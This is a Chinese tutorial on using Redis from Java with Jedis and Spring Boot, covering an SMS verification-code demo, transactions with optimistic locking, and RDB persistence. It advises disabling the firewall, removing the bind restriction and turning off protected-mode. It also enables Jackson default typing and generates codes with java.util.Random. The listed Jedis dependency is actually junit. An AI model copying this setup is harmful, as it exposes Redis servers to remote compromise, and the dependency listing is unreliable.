<p>Jedis &#x662F; redis &#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x5DE5;&#x5177;&#xFF0C;&#x5373;&#x901A;&#x8FC7; Java &#x64CD;&#x4F5C; redis&#x3002;&#x7C7B;&#x4F3C;&#x4E8E; JDBC &#x901A;&#x8FC7; Java &#x64CD;&#x4F5C;&#x6570;&#x636E;&#x5E93;&#x3002;</p>
<h3 id="%E6%99%AE%E9%80%9A%E5%B7%A5%E7%A8%8B%E4%BD%BF%E7%94%A8">&#x666E;&#x901A;&#x5DE5;&#x7A0B;&#x4F7F;&#x7528;</h3>
<ul>
<li>Jedis &#x7684;&#x4F9D;&#x8D56; jar &#x5305;</li>
</ul>
<pre><code class="language-xml">&lt;dependency&gt;
    &lt;groupId&gt;junit&lt;/groupId&gt;
    &lt;artifactId&gt;junit&lt;/artifactId&gt;
    &lt;version&gt;4.13.2&lt;/version&gt;
    &lt;scope&gt;compile&lt;/scope&gt;
&lt;/dependency&gt;
</code></pre>
<ul>
<li>&#x6CE8;&#x610F;&#x4E8B;&#x9879; =&gt; &#x5173;&#x95ED;&#x9632;&#x706B;&#x5899;&#xFF1B;bind &#x914D;&#x7F6E;&#x5E94;&#x6CE8;&#x91CA;&#xFF1B;protected-mode no</li>
</ul>
<pre><code class="language-shell">### --- shell --- ###
# &#x7981;&#x7528; Linux &#x7684;&#x9632;&#x706B;&#x5899;
systemctl status firewalld
systemctl stop/disable firewalld.service
### --- redis.conf --- ###
# bind &#x914D;&#x7F6E;&#x5E94;&#x6CE8;&#x91CA; =&gt; &#x4E0D;&#x53EA;&#x63A5;&#x53D7;&#x672C;&#x673A;&#x7684;&#x8BBF;&#x95EE;&#x8BF7;&#x6C42;
# bind=127.0.0.1
# protected-mode &#x4ECE;&#x9ED8;&#x8BA4;&#x7684; yes &#x6539;&#x4E3A; no
protected-mode no
</code></pre>
<ul>
<li>Jedis &#x5E38;&#x7528;&#x64CD;&#x4F5C;</li>
</ul>
<pre><code class="language-java">public class JedisDemo01 {
    public static void main(String[] args) {
        // &#x521B;&#x5EFA; jedis
        Jedis jedis = new Jedis(&quot;&lt;yourIP&gt;&quot;,6379);
        // &#x6D4B;&#x8BD5;
        String ping = jedis.ping();
        System.out.println(ping);
    }
    // &#x64CD;&#x4F5C; key
    @Test
    public void demo01(){
        Jedis jedis = new Jedis(&quot;&lt;yourIP&gt;&quot;,6379);
        jedis.set(&quot;user&quot;, &quot;zs&quot;);
        Set&lt;String&gt; keys = jedis.keys(&quot;*&quot;);
        for(String key : keys){
            System.out.println(key);
        }
        System.out.println(jedis.exists(&quot;user&quot;));
        System.out.println(jedis.ttl(&quot;user&quot;));
        System.out.println(jedis.get(&quot;user&quot;));
    }
    // &#x8BBE;&#x7F6E;&#x591A;&#x4E2A; key-value &#x64CD;&#x4F5C; String
    @Test
    public void demo02(){
        Jedis jedis = new Jedis(&quot;&lt;yourIP&gt;&quot;,6379);
        jedis.mset(&quot;str1&quot;,&quot;v1&quot;,&quot;str2&quot;,&quot;v2&quot;,&quot;str3&quot;,&quot;v3&quot;);
        System.out.println(jedis.mget(&quot;str1&quot;,&quot;str2&quot;,&quot;str3&quot;));
        jedis.flushDB();
    }
    // &#x64CD;&#x4F5C; list
    @Test
    public void demo03(){
        Jedis jedis = new Jedis(&quot;&lt;yourIP&gt;&quot;,6379);
        jedis.lpush(&quot;key1&quot;,&quot;zs&quot;,&quot;gz&quot;,&quot;hz&quot;,&quot;jr&quot;,&quot;ss&quot;);
        System.out.println(jedis.lrange(&quot;key1&quot;, 0, -1));
        jedis.flushDB();
    }
    // &#x64CD;&#x4F5C; set
    @Test
    public void demo04(){
        Jedis jedis = new Jedis(&quot;&lt;yourIP&gt;&quot;,6379);
        jedis.sadd(&quot;key1&quot;,&quot;zs&quot;,&quot;gz&quot;,&quot;hz&quot;,&quot;jr&quot;,&quot;ss&quot;);
        System.out.println(jedis.smembers(&quot;key1&quot;));
        jedis.flushDB();
    }
    // &#x64CD;&#x4F5C; hash
    @Test
    public void demo05(){
        Jedis jedis = new Jedis(&quot;&lt;yourIP&gt;&quot;,6379);
        jedis.hset(&quot;users&quot;,&quot;name&quot;,&quot;zs&quot;);
        System.out.println(jedis.hget(&quot;users&quot;,&quot;name&quot;));
        jedis.flushDB();
    }
    // &#x64CD;&#x4F5C; zset
    @Test
    public void demo06(){
        Jedis jedis = new Jedis(&quot;&lt;yourIP&gt;&quot;,6379);
        jedis.zadd(&quot;china&quot;,100,&quot;cs&quot;);
        System.out.println(jedis.zrange(&quot;china&quot;,0,-1));
        jedis.flushDB();
    }
}
</code></pre>
<ul>
<li>&#x624B;&#x673A;&#x9A8C;&#x8BC1;&#x7801;&#x529F;&#x80FD;</li>
</ul>
<p>&#x8981;&#x6C42;&#x8F93;&#x5165;&#x624B;&#x673A;&#x53F7;&#xFF0C;&#x70B9;&#x51FB;&#x53D1;&#x9001;&#x540E;&#x968F;&#x673A;&#x751F;&#x6210; 6 &#x4F4D;&#x6570;&#x5B57;&#x7801;&#xFF0C;2 &#x5206;&#x949F;&#x6709;&#x6548;&#xFF1B;&#x8F93;&#x5165;&#x9A8C;&#x8BC1;&#x7801;&#xFF0C;&#x70B9;&#x51FB;&#x9A8C;&#x8BC1;&#xFF0C;&#x8FD4;&#x56DE;&#x6210;&#x529F;&#x6216;&#x5931;&#x8D25;&#xFF1B;&#x6BCF;&#x4E2A;&#x624B;&#x673A;&#x53F7;&#x6BCF;&#x5929;&#x53EA;&#x80FD;&#x8F93;&#x5165; 3 &#x6B21;&#x3002;</p>
<pre><code class="language-java">public class JedisDemo02 {
    public static void main(String[] args) {
        // &#x6A21;&#x62DF;&#x9A8C;&#x8BC1;&#x7801;&#x53D1;&#x9001;
//        verifyCode(&quot;12345678987&quot;);

        // &#x6A21;&#x62DF;&#x9A8C;&#x8BC1;&#x7801;&#x6821;&#x9A8C;
         getRedisCode(&quot;12345678987&quot;,&quot;809507&quot;);
    }

    // 3 &#x9A8C;&#x8BC1;&#x7801;&#x6821;&#x9A8C;
    public static void getRedisCode(String phone,String code) {
        //&#x4ECE;redis&#x83B7;&#x53D6;&#x9A8C;&#x8BC1;&#x7801;
        Jedis jedis = new Jedis(&quot;xxx.xx.xx.xxx&quot;,6379);
//        jedis.auth();
        // &#x9A8C;&#x8BC1;&#x7801;key
        String codeKey = &quot;VerifyCode&quot;+phone+&quot;:code&quot;;
        String redisCode = jedis.get(codeKey);
        // &#x5224;&#x65AD;
        if(redisCode.equals(code)) {
            System.out.println(&quot;&#x6210;&#x529F;&quot;);
        }else {
            System.out.println(&quot;&#x5931;&#x8D25;&quot;);
        }
        jedis.close();
    }

    // 2 &#x6BCF;&#x4E2A;&#x624B;&#x673A;&#x6BCF;&#x5929;&#x53EA;&#x80FD;&#x53D1;&#x9001;&#x4E09;&#x6B21;&#xFF0C;&#x9A8C;&#x8BC1;&#x7801;&#x653E;&#x5230;redis&#x4E2D;&#xFF0C;&#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4;120
    public static void verifyCode(String phone) {
        // &#x8FDE;&#x63A5;redis
        Jedis jedis = new Jedis(&quot;xxx.xx.xx.xxx&quot;,6379);

        // &#x62FC;&#x63A5;key
        // &#x624B;&#x673A;&#x53D1;&#x9001;&#x6B21;&#x6570;key
        String countKey = &quot;VerifyCode&quot;+phone+&quot;:count&quot;;
        // &#x9A8C;&#x8BC1;&#x7801;key
        String codeKey = &quot;VerifyCode&quot;+phone+&quot;:code&quot;;

        // &#x6BCF;&#x4E2A;&#x624B;&#x673A;&#x6BCF;&#x5929;&#x53EA;&#x80FD;&#x53D1;&#x9001;&#x4E09;&#x6B21;
        String count = jedis.get(countKey);
        if(count == null) {
            // &#x6CA1;&#x6709;&#x53D1;&#x9001;&#x6B21;&#x6570;&#xFF0C;&#x7B2C;&#x4E00;&#x6B21;&#x53D1;&#x9001;
            // &#x8BBE;&#x7F6E;&#x53D1;&#x9001;&#x6B21;&#x6570;&#x662F;1
            jedis.setex(countKey,24*60*60,&quot;1&quot;);
        } else if(Integer.parseInt(count)&lt;=2) {
            // &#x53D1;&#x9001;&#x6B21;&#x6570;+1
            jedis.incr(countKey);
        } else if(Integer.parseInt(count)&gt;2) {
            // &#x53D1;&#x9001;&#x4E09;&#x6B21;&#xFF0C;&#x4E0D;&#x80FD;&#x518D;&#x53D1;&#x9001;
            System.out.println(&quot;&#x4ECA;&#x5929;&#x53D1;&#x9001;&#x6B21;&#x6570;&#x5DF2;&#x7ECF;&#x8D85;&#x8FC7;&#x4E09;&#x6B21;&quot;);
            jedis.close();
            return;//&#x8D85;&#x8FC7;&#x4E09;&#x6B21;&#x4E4B;&#x540E;&#x5C31;&#x4F1A;&#x81EA;&#x52A8;&#x9000;&#x51FA;&#x4E0D;&#x4F1A;&#x518D;&#x53D1;&#x9001;&#x4E86;&#xFF0C;&#x4E0D;&#x6DFB;&#x52A0;&#x8FD9;&#x4E00;&#x884C;&#xFF0C;&#x5373;&#x4F7F;&#x663E;&#x793A;&#x53D1;&#x9001;&#x6B21;&#x6570;&#xFF0C;&#x4F46;&#x8FD8;&#x4F1A;&#x6709;&#x9A8C;&#x8BC1;&#x7801;&#x63A5;&#x6536;&#x5230;
        }

        // &#x53D1;&#x9001;&#x9A8C;&#x8BC1;&#x7801;&#x653E;&#x5230; redis &#x91CC;&#x9762;
        String vcode = getCode(); // &#x8C03;&#x7528;&#x751F;&#x6210;&#x7684;&#x9A8C;&#x8BC1;&#x7801;
        jedis.setex(codeKey,120,vcode); // &#x8BBE;&#x7F6E;&#x751F;&#x6210;&#x7684;&#x9A8C;&#x8BC1;&#x7801;&#x53EA;&#x6709;120&#x79D2;&#x7684;&#x65F6;&#x95F4;
        jedis.close();
    }

    // 1 &#x751F;&#x6210;6&#x4F4D;&#x6570;&#x5B57;&#x9A8C;&#x8BC1;&#x7801;&#xFF0C;code&#x662F;&#x9A8C;&#x8BC1;&#x7801;
    public static String getCode() {
        Random random = new Random();
        String code = &quot;&quot;;
        for(int i=0;i&lt;6;i++) {
            int rand = random.nextInt(10);
            code += rand;
        }
        return code;
    }
}
</code></pre>
<h3 id="springboot-%E6%95%B4%E5%90%88-redis">SpringBoot &#x6574;&#x5408; redis</h3>
<ul>
<li>&#x5728; pom.xml &#x6587;&#x4EF6;&#x4E2D;&#x5F15;&#x5165; redis &#x76F8;&#x5173;&#x4F9D;&#x8D56;</li>
</ul>
<pre><code class="language-xml">&lt;!-- redis --&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;
&lt;/dependency&gt;
&lt;!-- spring2.X &#x96C6;&#x6210; redis &#x6240;&#x9700; common-pool2--&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
    &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;
    &lt;version&gt;2.11.1&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;
    &lt;version&gt;2.13.3&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
    &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;
    &lt;version&gt;2.13.3&lt;/version&gt;
&lt;/dependency&gt;
&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre>
<ul>
<li>application.properties &#x914D;&#x7F6E; redis</li>
</ul>
<pre><code class="language-properties"># Redis &#x670D;&#x52A1;&#x5668;&#x5730;&#x5740;
spring.redis.host=&lt;yourIP&gt;
# Redis &#x5BC6;&#x7801;
spring.redis.password=&lt;yourPassword&gt;
# Redis &#x670D;&#x52A1;&#x5668;&#x8FDE;&#x63A5;&#x7AEF;&#x53E3;
spring.redis.port=6379
# Redis &#x6570;&#x636E;&#x5E93;&#x7D22;&#x5F15;
spring.redis.database= 0
# &#x8FDE;&#x63A5;&#x8D85;&#x65F6;&#x65F6;&#x95F4; =&gt; ms
spring.redis.timeout=1800000
# &#x8FDE;&#x63A5;&#x6C60;&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x6570; =&gt; &#x8D1F;&#x503C;&#x8868;&#x793A;&#x6CA1;&#x6709;&#x9650;&#x5236;
spring.redis.lettuce.pool.max-active=20
# &#x6700;&#x5927;&#x963B;&#x585E;&#x7B49;&#x5F85;&#x65F6;&#x95F4; =&gt; &#x8D1F;&#x6570;&#x8868;&#x793A;&#x6CA1;&#x9650;&#x5236;
spring.redis.lettuce.pool.max-wait=-1
# &#x8FDE;&#x63A5;&#x6C60;&#x4E2D;&#x7684;&#x6700;&#x5927;&#x7A7A;&#x95F2;&#x8FDE;&#x63A5;
spring.redis.lettuce.pool.max-idle=5
# &#x8FDE;&#x63A5;&#x6C60;&#x4E2D;&#x7684;&#x6700;&#x5C0F;&#x7A7A;&#x95F2;&#x8FDE;&#x63A5;
spring.redis.lettuce.pool.min-idle=0
</code></pre>
<ul>
<li>&#x6DFB;&#x52A0; redis &#x914D;&#x7F6E;&#x7C7B;</li>
</ul>
<pre><code class="language-java">@EnableCaching
@Configuration
public class RedisConfig extends CachingConfigurerSupport {

    @Bean
    public RedisTemplate&lt;String, Object&gt; redisTemplate(RedisConnectionFactory factory) {
        RedisTemplate&lt;String, Object&gt; template = new RedisTemplate&lt;&gt;();
        RedisSerializer&lt;String&gt; redisSerializer = new StringRedisSerializer();
        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer(Object.class);
        ObjectMapper om = new ObjectMapper();
        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);
        om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
        jackson2JsonRedisSerializer.setObjectMapper(om);
        template.setConnectionFactory(factory);
        // key &#x5E8F;&#x5217;&#x5316;&#x65B9;&#x5F0F;
        template.setKeySerializer(redisSerializer);
        // value &#x5E8F;&#x5217;&#x5316;
        template.setValueSerializer(jackson2JsonRedisSerializer);
        // value hashmap &#x5E8F;&#x5217;&#x5316;
        template.setHashValueSerializer(jackson2JsonRedisSerializer);
        return template;
    }

    @Bean
    public CacheManager cacheManager(RedisConnectionFactory factory) {
        RedisSerializer&lt;String&gt; redisSerializer = new StringRedisSerializer();
        Jackson2JsonRedisSerializer jackson2JsonRedisSerializer = new Jackson2JsonRedisSerializer(Object.class);
        // &#x89E3;&#x51B3;&#x67E5;&#x8BE2;&#x7F13;&#x5B58;&#x8F6C;&#x6362;&#x5F02;&#x5E38;
        ObjectMapper om = new ObjectMapper();
        om.setVisibility(PropertyAccessor.ALL, JsonAutoDetect.Visibility.ANY);
        om.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
        jackson2JsonRedisSerializer.setObjectMapper(om);
        // &#x914D;&#x7F6E;&#x5E8F;&#x5217;&#x5316; =&gt; &#x89E3;&#x51B3;&#x4E71;&#x7801; =&gt; &#x8FC7;&#x671F;&#x65F6;&#x95F4; 600 &#x79D2;
        RedisCacheConfiguration config = RedisCacheConfiguration.defaultCacheConfig()
                .entryTtl(Duration.ofSeconds(600))
                .serializeKeysWith(RedisSerializationContext.SerializationPair.fromSerializer(redisSerializer))
                .serializeValuesWith(RedisSerializationContext.SerializationPair.fromSerializer(jackson2JsonRedisSerializer))
                .disableCachingNullValues();
        RedisCacheManager cacheManager = RedisCacheManager.builder(factory)
                .cacheDefaults(config)
                .build();
        return cacheManager;
    }
}
</code></pre>
<ul>
<li>RedisTestController &#x4E2D;&#x6DFB;&#x52A0;&#x6D4B;&#x8BD5;&#x65B9;&#x6CD5;</li>
</ul>
<pre><code class="language-java">@RestController
@RequestMapping(&quot;/redisTest&quot;)
public class RedisTestController {
    @Autowired
    private RedisTemplate redisTemplate;

    @GetMapping
    public String testRedis() {
        // &#x8BBE;&#x7F6E;&#x503C;
        redisTemplate.opsForValue().set(&quot;name&quot;,&quot;zs&quot;);
        // &#x83B7;&#x53D6;&#x503C;
        String name = (String)redisTemplate.opsForValue().get(&quot;name&quot;);
        return name;
    }
}
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E4%BA%8B%E5%8A%A1%E5%92%8C%E9%94%81%E6%9C%BA%E5%88%B6">&#x4E8B;&#x52A1;&#x548C;&#x9501;&#x673A;&#x5236;</h2>
<h3 id="redis-%E4%BA%8B%E5%8A%A1">Redis &#x4E8B;&#x52A1;</h3>
<blockquote>
<p>Redis &#x4E8B;&#x52A1;&#x5141;&#x8BB8;&#x5728;&#x4E00;&#x4E2A;&#x6B65;&#x9AA4;&#x4E2D;&#x6267;&#x884C;&#x4E00;&#x7EC4;&#x547D;&#x4EE4;&#x3002;</p>
<ul>
<li>&#x5C5E;&#x6027;&#x4E00; =&gt; &#x4E8B;&#x52A1;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x547D;&#x4EE4;&#x4F5C;&#x4E3A;&#x5355;&#x4E2A;&#x9694;&#x79BB;&#x64CD;&#x4F5C;&#x6309;&#x987A;&#x5E8F;&#x6267;&#x884C;&#x3002;&#x53E6;&#x4E00;&#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x51FA;&#x7684;&#x8BF7;&#x6C42;&#x4E0D;&#x53EF;&#x80FD;&#x5728; Redis &#x4E8B;&#x52A1;&#x7684;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x5F97;&#x5230;&#x5904;&#x7406;&#x3002;</li>
<li>&#x5C5E;&#x6027;&#x4E8C; =&gt; Redis6 &#x4E4B;&#x524D;&#x7684;&#x547D;&#x4EE4;&#x64CD;&#x4F5C;&#x662F;&#x539F;&#x5B50;&#x6027;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x64CD;&#x4F5C;&#x662F;&#x5355;&#x7EBF;&#x7A0B;&#x7684;&#x3002;&#x539F;&#x5B50;&#x6027;&#x610F;&#x5473;&#x7740;&#x8981;&#x4E48;&#x6240;&#x6709;&#x547D;&#x4EE4;&#x90FD;&#x88AB;&#x5904;&#x7406;&#xFF0C;&#x8981;&#x4E48;&#x4E0D;&#x88AB;&#x5904;&#x7406;&#x3002;&#x82E5;&#x6709;&#x591A;&#x6761;&#x547D;&#x4EE4;&#x5E76;&#x53D1;&#x6267;&#x884C;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x539F;&#x5B50;&#x6027;&#x7684;&#x3002;</li>
</ul>
</blockquote>
<p>Redis &#x4E8B;&#x52A1;&#x7531;&#x547D;&#x4EE4; <code>MULTI</code> &#x53D1;&#x8D77;&#xFF0C;&#x7136;&#x540E;&#x9700;&#x4F20;&#x9012;&#x5E94;&#x5728;&#x4E8B;&#x52A1;&#x4E2D;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#x5217;&#x8868;&#xFF0C;&#x4E4B;&#x540E;&#x6574;&#x4E2A;&#x4E8B;&#x52A1;&#x7531; <code>EXEC</code> &#x6267;&#x884C;&#x3002;&#x5728;&#x7EC4;&#x961F;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; <code>DISCARD</code> &#x6765;&#x653E;&#x5F03;&#x7EC4;&#x961F;&#x3002;</p>
<pre><code class="language-shell">127.0.0.1:6379&gt; multi
OK
127.0.0.1:6379(TX)&gt; set k1 v1
QUEUED
127.0.0.1:6379(TX)&gt; set k2 v2
QUEUED
127.0.0.1:6379(TX)&gt; exec
1) OK
2) OK
127.0.0.1:6379&gt; multi
OK
127.0.0.1:6379(TX)&gt; set key1 value1
QUEUED
127.0.0.1:6379(TX)&gt; set key2 value2
QUEUED
127.0.0.1:6379(TX)&gt; discard
OK
</code></pre>
<h3 id="%E4%BA%8B%E5%8A%A1%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">&#x4E8B;&#x52A1;&#x9519;&#x8BEF;&#x5904;&#x7406;</h3>
<ul>
<li>&#x82E5;&#x7EC4;&#x961F;&#x4E2D;&#x67D0;&#x547D;&#x4EE4;&#x51FA;&#x73B0;&#x9519;&#x8BEF;&#xFF0C;&#x6267;&#x884C;&#x65F6;&#x6574;&#x4E2A;&#x961F;&#x5217;&#x90FD;&#x4F1A;&#x88AB;&#x53D6;&#x6D88;&#x3002;</li>
<li>&#x82E5;&#x6267;&#x884C;&#x9636;&#x6BB5;&#x67D0;&#x547D;&#x4EE4;&#x51FA;&#x73B0;&#x9519;&#x8BEF;&#xFF0C;&#x5219;&#x53EA;&#x6709;&#x62A5;&#x9519;&#x7684;&#x547D;&#x4EE4;&#x4E0D;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#xFF0C;&#x5176;&#x4ED6;&#x547D;&#x4EE4;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#xFF0C;&#x4E0D;&#x4F1A;&#x56DE;&#x6EDA;&#x3002;</li>
</ul>
<h3 id="%E4%BA%8B%E5%8A%A1%E5%86%B2%E7%AA%81">&#x4E8B;&#x52A1;&#x51B2;&#x7A81;</h3>
<ul>
<li>&#x60B2;&#x89C2;&#x9501; Pessimistic Lock</li>
</ul>
<p>&#x60B2;&#x89C2;&#x9501;&#x5BF9;&#x6570;&#x636E;&#x662F;&#x5426;&#x88AB;&#x5916;&#x754C;&#x4FEE;&#x6539;&#x6301;&#x4FDD;&#x5B88;&#x6001;&#x5EA6;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x5904;&#x7406;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5C06;&#x6570;&#x636E;&#x5904;&#x4E8E;&#x9501;&#x5B9A;&#x72B6;&#x6001;&#x3002;&#x4F20;&#x7EDF;&#x7684;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x7528;&#x5230;&#x4E86;&#x5F88;&#x591A;&#x8FD9;&#x79CD;&#x9501;&#x673A;&#x5236;&#xFF0C;&#x6BD4;&#x5982;&#x884C;&#x9501;&#x3001;&#x8868;&#x9501;&#x3001;&#x8BFB;&#x9501;&#xFF0C;&#x5199;&#x9501;&#x7B49;&#xFF0C;&#x90FD;&#x662F;&#x5728;&#x505A;&#x64CD;&#x4F5C;&#x4E4B;&#x524D;&#x5148;&#x4E0A;&#x9501;&#x3002;</p>
<ul>
<li>&#x4E50;&#x89C2;&#x9501; Optimistic Lock =&gt; &#x62A2;&#x7EA2;&#x5305; &#x6DD8;&#x5B9D;&#x62A2;&#x8D2D; &#x79D2;&#x6740;</li>
</ul>
<p>&#x4E50;&#x89C2;&#x9501;&#x4F1A;&#x5047;&#x8BBE;&#x6570;&#x636E;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x4E0D;&#x4F1A;&#x56E0;&#x4FEE;&#x6539;&#x800C;&#x9020;&#x6210;&#x51B2;&#x7A81;&#xFF0C;&#x53EA;&#x5728;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x63D0;&#x4EA4;&#x66F4;&#x65B0;&#x65F6;&#x624D;&#x4F1A;&#x6B63;&#x5F0F;&#x5BF9;&#x6570;&#x636E;&#x7684;&#x51B2;&#x7A81;&#x4E0E;&#x5426;&#x8FDB;&#x884C;&#x7248;&#x672C;&#x53F7;&#x68C0;&#x6D4B;&#x3002;&#x4E50;&#x89C2;&#x9501;&#x5229;&#x7528; Check-and-Set &#x673A;&#x5236;&#x5B9E;&#x73B0;&#x4E8B;&#x52A1;&#xFF0C;&#x9002;&#x7528;&#x4E8E;&#x591A;&#x8BFB;&#x7684;&#x5E94;&#x7528;&#x7C7B;&#x578B;&#x4EE5;&#x63D0;&#x9AD8;&#x541E;&#x5410;&#x91CF;&#x3002;</p>
<p><code>WATCH</code> &#x53EF;&#x76D1;&#x89C6;&#x6307;&#x5B9A;&#x952E;&#xFF0C;&#x5728;&#x4E8B;&#x52A1;&#x6267;&#x884C;&#x524D;&#x6307;&#x5B9A;&#x952E;&#x88AB;&#x5176;&#x4ED6;&#x547D;&#x4EE4;&#x6539;&#x52A8;&#xFF0C;&#x90A3;&#x4E48;&#x4E8B;&#x52A1;&#x6267;&#x884C;&#x5C06;&#x88AB;&#x6253;&#x65AD;&#x5E76;&#x901A;&#x77E5;&#x4E8B;&#x52A1;&#x5931;&#x8D25;&#x3002;<code>UNWATCH</code> &#x53EF;&#x53D6;&#x6D88; <code>WATCH</code> &#x547D;&#x4EE4;&#x5BF9;&#x6307;&#x5B9A;&#x952E;&#x7684;&#x76D1;&#x89C6;&#x3002;</p>
<pre><code class="language-shell"># window1
127.0.0.1:6379&gt; set balance 100
OK
127.0.0.1:6379&gt; watch balance
OK
127.0.0.1:6379&gt; multi
OK
127.0.0.1:6379(TX)&gt; incrby balance 20
QUEUED
127.0.0.1:6379(TX)&gt; exec
(nil)
127.0.0.1:6379&gt; get balance
&quot;110&quot;
# window2
127.0.0.1:6379&gt; keys *
1) &quot;balance&quot;
127.0.0.1:6379&gt; watch balance
OK
127.0.0.1:6379&gt; multi
OK
127.0.0.1:6379(TX)&gt; incrby balance 10
QUEUED
127.0.0.1:6379(TX)&gt; exec
1) (integer) 110
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="redis-%E6%8C%81%E4%B9%85%E5%8C%96">Redis &#x6301;&#x4E45;&#x5316;</h2>
<p>AOF &#x8868;&#x793A;&#x9644;&#x52A0;&#x6587;&#x4EF6;&#xFF0C;&#x662F;&#x66F4;&#x6539;&#x65E5;&#x5FD7;&#x6837;&#x5F0F;&#x7684;&#x6301;&#x4E45;&#x5316;&#x3002;RDB &#x7528;&#x4E8E; Redis &#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x662F;&#x5FEB;&#x7167;&#x98CE;&#x683C;&#x7684;&#x6301;&#x4E45;&#x5316;&#x3002;</p>
<h3 id="rdb-redis-database">RDB Redis DataBase</h3>
<p>&#x4EE5;&#x6307;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x5C06;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x96C6;&#x5FEB;&#x7167;&#x5199;&#x5165;&#x78C1;&#x76D8;&#xFF0C;&#x5373; SnapShot &#x5FEB;&#x7167;&#xFF0C;&#x5176;&#x6062;&#x590D;&#x65F6;&#x662F;&#x5C06;&#x5FEB;&#x7167;&#x6587;&#x4EF6;&#x76F4;&#x63A5;&#x8BFB;&#x5230;&#x5185;&#x5B58;&#x91CC;&#x3002;&#x5185;&#x5B58;&#x6301;&#x4E45;&#x5316;&#x540E;&#x5728;&#x542F;&#x52A8;&#x8DEF;&#x5F84;&#x751F;&#x6210;&#x6587;&#x4EF6; dump.rdb&#x3002;&#x540C;&#x6B65;&#x4E4B;&#x524D;&#x4F1A;&#x5148;&#x5EFA;&#x7ACB;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x5E76;&#x653E;&#x5165;&#x6570;&#x636E;&#xFF0C;&#x6B64;&#x540E;&#x624D;&#x66FF;&#x6362;&#x4E3B;&#x8981;&#x5185;&#x5BB9;&#x3002;</p>
<p>&#x6CE8;&#x610F;&#x5F53;&#x672A;&#x6301;&#x4E45;&#x5316;&#x7684;&#x6700;&#x65B0;&#x4E00;&#x6B21;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#x5185;&#xFF0C;&#x82E5;&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x7684;&#x540C;&#x65F6;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#xFF0C;&#x90A3;&#x4E48;&#x4F1A;&#x9020;&#x6210;&#x6570;&#x636E;&#x4E22;&#x5931;&#x3002;</p>
<ul>
<li>RDB &#x6301;&#x4E45;&#x5316;&#x6D41;&#x7A0B; =&gt; &#x5355;&#x72EC; fork &#x4E00;&#x4E2A;&#x5B50;&#x8FDB;&#x7A0B;&#x8FDB;&#x884C;&#x6301;&#x4E45;&#x5316;</li>
</ul>
<p>&#x9996;&#x5148;&#x5C06;&#x6570;&#x636E;&#x5199;&#x5165;&#x4E00;&#x4E2A;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#xFF0C;&#x5F85;&#x6301;&#x4E45;&#x5316;&#x8FC7;&#x7A0B;&#x7ED3;&#x675F;&#x518D;&#x7528;&#x8FD9;&#x4E2A;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x66FF;&#x6362;&#x6389;&#x4E0A;&#x6B21;&#x6301;&#x4E45;&#x5316;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x5728;&#x6B64;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x4E3B;&#x8FDB;&#x7A0B;&#x4E0D;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x7684; IO &#x64CD;&#x4F5C;&#x3002;</p>
